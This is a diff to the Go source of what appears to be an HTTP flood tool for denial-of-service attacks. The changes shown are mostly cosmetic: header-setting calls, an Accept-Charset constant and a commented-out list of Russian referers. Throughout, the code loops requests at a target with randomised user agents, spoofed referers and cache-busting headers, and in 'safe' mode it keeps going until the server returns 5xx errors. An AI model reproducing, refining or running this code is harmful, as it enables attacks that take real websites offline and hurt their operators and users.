@@ -23,7 +23,9 @@ import (
 	"runtime"
 )
 
-const ACCEPT_CHARSET = "windows-1251,utf-8;q=0.7,*;q=0.7"
+// const ACCEPT_CHARSET = "windows-1251,utf-8;q=0.7,*;q=0.7" // use it for runet
+const ACCEPT_CHARSET = "ISO-8859-1,utf-8;q=0.7,*;q=0.7"
+
 const (
 	STARTED = iota
 	EXIT_OK
@@ -36,10 +38,10 @@ var request_counter int = 0
 var safe bool = false
 var headers_referers []string = []string{
 	"http://www.google.com/?q=",
-    "http://www.usatoday.com/search/results?q=",
-    "http://engadget.search.aol.com/search?q=",
-    "http://www.google.ru/?hl=ru&q=",
-    "http://yandex.ru/yandsearch?text=",
+	"http://www.usatoday.com/search/results?q=",
+	"http://engadget.search.aol.com/search?q=",
+	//"http://www.google.ru/?hl=ru&q=",
+	//"http://yandex.ru/yandsearch?text=",
 }
 var headers_useragents []string = []string{
 	"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
@@ -98,9 +100,6 @@ func main() {
 			case EXIT_ERR:
 				err++
 				cur--
-/*				if (cur + err) / err > 4 {
-					runtime.GC()
-				}*/
 			case EXIT_OK:
 				cur--		
 			case COMPLETE:
@@ -113,7 +112,7 @@ func main() {
 	ctlc := make(chan os.Signal)
 	signal.Notify(ctlc, syscall.SIGINT, syscall.SIGKILL, syscall.SIGTERM)
 	<-ctlc
-	fmt.Println("\r-- Interrupted by user --        \n\n\r")
+	fmt.Println("\r\n-- Interrupted by user --        \n")
 }
 
 func httpcall(url string, host string, s chan int) {
@@ -134,20 +133,23 @@ Reuse:
 		return
 	}
 	q.Header.Set("User-Agent", headers_useragents[rand.Intn(len(headers_useragents))])
-  q.Header.Add("Cache-Control", "no-cache")
-  q.Header.Add("Accept-Charset", ACCEPT_CHARSET)
-  q.Header.Set("Referer", headers_referers[rand.Intn(len(headers_referers))] + buildblock(rand.Intn(5) + 5))
-  q.Header.Set("Keep-Alive", strconv.Itoa(rand.Intn(10)+100))
-  q.Header.Add("Connection", "keep-alive")
-  q.Header.Add("Host", host)	
+	q.Header.Set("Cache-Control", "no-cache")
+	q.Header.Set("Accept-Charset", ACCEPT_CHARSET)
+	q.Header.Set("Referer", headers_referers[rand.Intn(len(headers_referers))] + buildblock(rand.Intn(5) + 5))
+	q.Header.Set("Keep-Alive", strconv.Itoa(rand.Intn(10)+100))
+	q.Header.Set("Connection", "keep-alive")
+	q.Header.Set("Host", host)	
 	r, e := client.Do(q)	
 	if e != nil {
 		s<-EXIT_ERR
 		return
 	}
 	r.Body.Close()
-	if safe && (r.StatusCode == 500 || r.StatusCode == 501 || r.StatusCode == 502 || r.StatusCode == 503 || r.StatusCode == 504) {
-		s<-COMPLETE
+	if safe {
+		switch r.StatusCode {
+		case 500, 501, 502, 503, 504:
+			s<-COMPLETE
+		}
 	} else {
 		time.Sleep(144 * time.Millisecond)
 		goto Reuse
